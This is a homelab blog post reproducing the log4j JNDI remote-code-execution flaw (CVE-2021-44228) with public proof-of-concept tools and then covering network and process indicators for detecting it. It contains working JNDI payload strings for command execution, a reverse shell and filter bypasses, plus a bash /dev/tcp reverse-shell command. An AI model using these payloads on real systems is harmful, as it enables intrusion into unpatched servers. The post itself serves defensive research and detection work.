---
title: log4j JNDI Exploitation
date: 2021-12-10
categories: []
tags: [homelab, offsec, research, purpleteam]
---
# Situation
A [remote code execution (RCE) bug was found in log4j](https://www.lunasec.io/docs/blog/log4j-zero-day/). [CVE 2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) has been assigned to it. The vulnerability lies in how log4j interprets Java Naming and Directory Interface (JNDI) URLs. JNDI lets an application look up a service. An attacker can craft a string that looks like "${jndi:proto://host/a}" where `proto` is ldap or rmi, and log4j will connect to the `host` to retrieve `a`, which would specify how to process the log entry. However, `a` can instead provide Java bytecode that log4j will execute. 

log4j is used in [a lot of places](https://github.com/YfryTchsGD/Log4jAttackSurface). The attacker can submit malicious input to multiple places. This includes: in a web form, as a user-agent, by renaming their Tesla, or sending a chat in Minecraft. Where the vulnerability manifests depends on how that organization's infrastructure is configured. For [example](https://twitter.com/morimi01918178/status/1469328940313759744), it looks like naming your Airpods in the right format can induce a remote connection from Apple's iCloud servers. Airpods are synced across all devices that a user owns via iCloud, so clearly log4j is logging the Airpods name at some point during the sync process. Minecraft servers, and every user connected to the server, are getting popped because both the client and server are using log4j to log chat messages.

In the rest of this blog, we'll look at getting a Proof of Concept (PoC) running and what indicators we can extract from the networks and endpoints.


# Get the PoC running
The first PoC I found was from [tangxiaofeng7](https://github.com/tangxiaofeng7/apache-log4j-poc). This has a vulnerable "app" that simply calls log4j with a malicious endpoint. The Github page shows macOS Calculator.app being run as the payload. I'm going to use Ubuntu Linux as my test system, so I need to either figure out how to change payload or find a different way of running the payloads. During research, I find [JNDIExploit](https://github.com/0x727/JNDIExploit). log4j is the "access" vector, but the actual bad thing happens due to JNDI. Let's use that.

1. Set up a new VM, Ubuntu 18.04. We need a Java Dev Kit and Maven. Clone the repo.

```
apt install openjdk-8-jdk maven
git clone https://github.com/tangxiaofeng7/apache-log4j-poc.git
git clone https://github.com/0x727/JNDIExploit
```

2. Build the projects
Spent way more time than I'd like trying to figure out how Java projects work.

```
cd JNDIExploit/
mvn package
cd target
java -jar JNDIExploit-1.3-SNAPSHOT.jar -i 0.0.0.0
```

`ss -anpt` shows 1389/tcp and 3456/tcp running, great success. 1389 is implementing an LDAP endpoint that will "instruct" the vulnerable log4j function to connect to another location and execute the bytecode found there. 3456 is running an HTTP server that hosts the malicious bytecode. Unfortunately, a straight build does not work for the log4j poc. Had quite a few problems getting org.apache.logging.log4j to load. Seems like there are several methods to get it work, but here's what I did.

```
cd ~/apache-log4j-poc
vim pom.xml
```

The POM file is a manifest for the Maven project. We add the maven-shade-plugin to generate an Uber JAR that includes log4j jars.

```
<build>
	<plugins>
	<plugin>
		<groupId>org.apache.maven.plugins</groupId>
		<artifactId>maven-shade-plugin</artifactId>
		<version>2.4.1</version>
		<executions>
	  		<execution>
				<phase>package</phase>
				<goals>
		  		<goal>shade</goal>
				</goals>
				<configuration>
		  		<transformers>
					<transformer implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer">
			  		<mainClass>log4j</mainClass>
					</transformer>
		  		</transformers>
				</configuration>
	  		</execution>
		</executions>
	  </plugin>
	</plugins>
</build>
```

Now we can build with `mvn clean package`. This removes everything in a `target` directory and then packages the project into a .jar. We can then execute it with `java -jar target/log4j-rce-1.0-SNAPSHOT.jar`. If we do, wee see the message 

```
01:27:16.300 [main] ERROR log4j - ${jndi:ldap://127.0.0.1:1389/a}
```

And from the terminal window in which JNDIExploit is running from, we see

```
[+] Received LDAP Query: a
[!] Invalid LDAP Query: a
```

If we run `JNDIExploit-1.3-SNAPSHOT.jar -u` we see the list of endpoints we can specify. We need to match the `a` value to a legitimate endpoint that JDNIExploit is serving up. Edit `apache-log4j-poc/src/main/java/log4j.java` to call something that legit. Inside of the main class, I put a bunch of payloads so I can later compare what happens.

```
logger.error("${jndi:ldap://127.0.0.1:1389/Basic/Command/whoami}");
logger.error("${jndi:ldap://127.0.0.1:1389/Basic/Dnslog/---.canarytokens.com}"); // get your own token at https://canarytokens.org/generate#
logger.error("${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/d2hvYW1pCg==}");   // whoami
logger.error("${jndi:ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444}");
logger.error("${jndi:ldap://127.0.0.1:1389/Basic/TomcatEcho}");
logger.error("${jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/---.canarytokens.com}");
logger.error("${jndi:ldap://127.0.0.1:1389/TomcatBypass/Dnslog/---.canarytokens.com}");
logger.error("${jndi:ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/---.canarytokens.com}");
logger.error("${jndi:ldap://127.0.0.1:1389/TomcatBypass/Dnslog/---.canarytokens.com}");
```

Once edited, we call `mvn clean package` again and then re-run the jar. This time, we see errors like `01:31:06.557 [main] ERROR log4j - Reference Class Name: foo`, however we get successful connections to JDNIExploit that look like:

```
[+] Sending LDAP ResourceRef result for Basic/Command/Base64/d2hvYW1pCg== with basic remote reference payload
[+] Send LDAP reference result for Basic/Command/Base64/d2hvYW1pCg== redirecting to http://0.0.0.0:3456/ExploittvsunipOlR.class
```

If we had a packet capture running at this point, we'd see that the LDAP server is being connected to, but that HTTP server running on 3456/tcp is not being connected to. It turns out we've known [since 2016](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf) that JDNI is a vector for exploitation, and [since Java 8u191](https://www-cnblogs-com.translate.goog/yyhuni/p/15088134.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US) the default has been to not connect to URLs provided in a JNDI string. So we need to add `com.sun.jndi.ldap.object.trustURLCodebase` to log4j.java, before we call logger.

Now everything should work. I'll start tcpdump to capture packets before re-running the vulnerable jar (`tcpdump -i lo -s 65535 -w /home/user/ldap.pcap tcp port 1389 or tcp port 3456`), and start a netcat listener to catch the reverse shell (`nc -nvlp 4444`). This time, both the LDAP and HTTP servers receive connections, you will trigger the DNS canary token, and receive a reverse shell to your listener.

# Observables
How can we detect or hunt for this activity?

The overall attack flow (killchain) is:

1. Attacker provides “${jndi:ldap://host/endpoint}“ to an input field
2. Vulnerable machine connects to supplied proto://host/endpoint
3. The host from step 2 specifies bytecode to retrieve and execute, we'll call it proto2://host2/endpoint2
4. Vulnerable machine connects to the proto2://host2/endpoint2
5. Payload java .class is transferred
6. Vulnerable machine executes .class

We can see this in the PCAP
![log4j exploitation pcap](/assets/img/log4j-pcap.png)

Can we detect (1)? The whole purpose of log4j is to log, so the malicious input is going _somewhere_. Is that log being centralized and indexed? Can we prevent the attack at (1)? Maybe. If the input vector is in line with something like a Web App Firewall (WAF), you might be able to block it before it gets to the vulnerable function. However, not every implementation has that opportunity, and even if you do, there are a lot of [permutations](https://twitter.com/stereotype32/status/1469313856229228544?s=20) that could make blocking with a WAR hard.

Can we detect (2)? By default, yes we should be able to. LDAP normally occurs over 389/tcp. However, we saw with JNDIExploit that it was running LDAP on 1389. Changing the port can obscure the traffic, but a protocol dissector can still identify LDAP since it is clear text. We can inspect outgoing traffic for LDAP using a tool like Suricata, and potentially block once it is observed.

![ldap traffic in Wireshark](/assets/img/ldap-wireshark.png)

(3) happens on the attacker infrastructure.

Can we detect (4)? By default, yes we should be able to. HTTP is cleartext. We can look for HTTP GET verbs for *.class. That's pretty low-fidelity, but until you have the vulnerability patched, it might be worth investigating through the noise. Similarly, for step (5) we can use zeek to look for transferred files.

Can we detect (6)? This is the tough one. On one hand, you can detect "weak" attacks. Here  is the process list (`ps -efwwwH`) from the reverse shell:

```
root      9171     1  0 01:38 pts/4    00:00:00   /bin/bash -c /bin/bash -i >& /dev/tcp/10.10.10.146/4444 0>&1
root      9172  9171  0 01:38 pts/4    00:00:00     /bin/bash -i
root      9194  9172  0 01:38 pts/4    00:00:00       ps -efwwwH
```

The clear indicator is the [/dev/tcp](https://www.gnucitizen.org/blog/reverse-shell-with-bash/) trick to create a TCP connection. Another indicator is bash as a child of init. This may be implementation specific. The PoC is a single function .jar file. Once the java process exits, its children (bash in this case) are reaped and inherited by init. On a "real" server application, the java process is not likely to exit after log4j is called, so the process tree will look different. What we should see in that case is java as the parent of bash.
 
That's all for now. I'll update as I learn more.